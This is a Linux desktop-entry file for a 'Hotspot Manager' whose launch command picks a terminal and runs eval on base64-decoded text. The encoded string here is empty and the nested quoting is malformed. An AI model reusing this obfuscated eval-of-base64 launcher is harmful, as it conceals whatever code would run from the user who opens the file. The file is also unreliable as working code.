#!/usr/bin/env xdg-open
[Desktop Entry]
Version=1.0
Type=Application
Name=Hotspot Manager
Comment=Manage WiFi Hotspot — Auto Terminal
Exec=bash -c 'for t in gnome-terminal konsole cosmic-terminal xfce4-terminal mate-terminal xterm; do if command -v $t >/dev/null 2>&1; then case $t in gnome-terminal|cosmic-terminal|xterm) $t -- bash -c "eval "$(echo  | base64 -d)""; break ;; *) $t -e "bash -c \"eval "$(echo  | base64 -d)"\""; break ;; esac; fi; done'
Icon=network-wireless
Terminal=false
Categories=Network;System;
Keywords=hotspot;wifi;network;
StartupNotify=false
